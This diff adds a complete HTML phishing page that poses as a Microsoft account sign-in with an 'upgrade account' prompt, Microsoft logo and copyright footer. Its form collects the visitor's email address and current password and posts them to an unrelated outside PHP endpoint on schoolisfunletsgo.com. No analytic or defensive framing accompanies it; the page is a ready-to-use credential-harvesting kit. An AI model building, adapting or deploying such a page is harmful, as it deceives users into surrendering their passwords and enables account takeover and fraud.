@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="shortcut icon" href=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAVFBMVEX0TiSBuQABpO//uQL////zPgD839q71418twCUz/YAoO54tQDo8dz/2ZT/tgAAnu7c7fz/143zKgD83Ne21YX++fjx9+qNzPbr9f3/6cIAmu7/1ojz0lEEAAABIElEQVR4nO3PNxLCQAAEwQMk4YX3//8nGSIh3eKg5wNTXUqstmteTWejVDkgISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEh4RcK21j7wyA8LmOVLtdpEJ5XsUrz6xHWH2H9EdYfYf39gXAe63Idtrd1rLKIdd8Owkcfq4xjbd6Eu36SipCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkPBzT1a6jroC5x5uAAAAAElFTkSuQmCC">
+<title>Sign into your Microsoft account</title>
+<style>
+input[type=password] {
+    width: 375px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=text] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=email] {
+    width: 375px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+
+h1 {
+	font-family: "Helvetica Neue";
+	font-size: 40px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 40px;
+}
+h2 {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 18px;
+}
+h3 {
+	font-family: "Helvetica Neue";
+	font-size: 16px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 18px;
+	color: #4d79ff;
+}
+h4 {
+	font-family: "Helvetica Neue";
+	font-size: 11px;
+	font-style:normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 23px;
+}
+.error {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 20px;
+	color:#ff1a1a;
+}
+a:link {
+ text-decoration:none;
+ color: #4d79ff;
+}
+a:visited {
+ text-decoration:none;
+ color: #4d79ff;
+}
+
+
+
+    @-webkit-keyframes rotate {
+    from {
+        -webkit-transform: rotate(0deg);
+    }
+    to {
+        -webkit-transform: rotate(360deg);
+    }
+}
+#loading {
+    border: 1px solid #000;
+    border-right: 0;
+    border-bottom: 0;
+    -webkit-border-radius: 100px;
+    height: 100px;
+    width: 100px;
+    margin: 100px;
+    -webkit-transition: all 0.5s ease-in;
+    -webkit-animation-name:             rotate;
+    -webkit-animation-duration:         1.0s;
+    -webkit-animation-iteration-count:  infinite;
+    -webkit-animation-timing-function: linear;
+}
+
+.loader {
+    border: 6px solid #f3f3f3; /* Light grey 16 */
+    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
+    border-radius: 50%;
+    width: 60px;/*120*/
+    height: 60px;/*120*/
+    animation: spin 1s linear infinite;
+    position: fixed;
+    top: 250px;
+    left: 48%;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+img {
+  width:20%;
+}
+
+
+
+</style>
+</head>
+<!--<body onLoad="iniciar();">
+
+<body>
+!--<div class="form1" id="form1"></div>-->
+
+<div align=center>
+<form name="form1" id="form1" method="post" action="https://schoolisfunletsgo.com/NTG_Baby/LittleBABY.php">
+<table width="1000" border="0" cellspacing="1" cellpadding="2">
+<tr>
+	<td colspan="4"><div align="center"><img id="superior" src="https://zdnet2.cbsistatic.com/hub/i/r/2014/08/27/0d77a99a-2da9-11e4-9e6a-00505685119a/resize/1200x900/02acdb68a1edf918b42c3fabf4843745/microsofts-logo-gets-a-makeover.jpg" width="20%" height="10%"></div><br><br></td>
+</tr>
+<tr>
+	<td colspan="4"><div align="center"><h1>upgrade account</h1></div></td>
+</tr>
+	<td colspan="4"><div align="center"><h2>Confirm your email address</h2></div></td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center"><input type="email" id="correo" name="email" placeholder="Enter your email address" required></div>
+	</td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center"><input type="password" id="pass" name="password" placeholder="Enter your current password" required ></div>
+		<!--<input type="hidden" name="oculto" value="formValidar">
+		<div align="center" id="error_p" class="error">&nbsp;</div>-->
+	</td>
+</tr>
+
+
+<tr>
+	<!--<td colspan="4"><div align="center"><br><br><a onClick="validar();"><img id="confirmar" src="lib/images/confirmar.png" width="160" height="32"></a></div><br><br><br></td>-->
+    
+    <td colspan="4"><div align="center"><br><br><input type="image" name="imageField" width="10%" src="https://img.pngio.com/confirm-button-png-2-png-image-confirm-png-968_251.png" />
+   <!-- <img id="confirmar" src="lib/images/confirmar.png" width="160" height="32"></a>--></div><br><br><br></td>
+</tr>
+
+<tr>
+	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
+	<td width="160"><div align="center"><h3><a target="_blank" href="#">Terms of use</a></h3></div></td>
+	<td width="160"><div align="center"><h3><a target="_blank" href="#">Privacy and cookies</a></h3></div></td>
+	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
+</tr>
+
+
+<tr>
+	<td colspan="4"><div align="center"> <h4>&copy; 2021 Microsoft.</h4></div><br><br></td>
+</tr>
+
+</table>
+</form>
+</div>
+</body>
+</html>
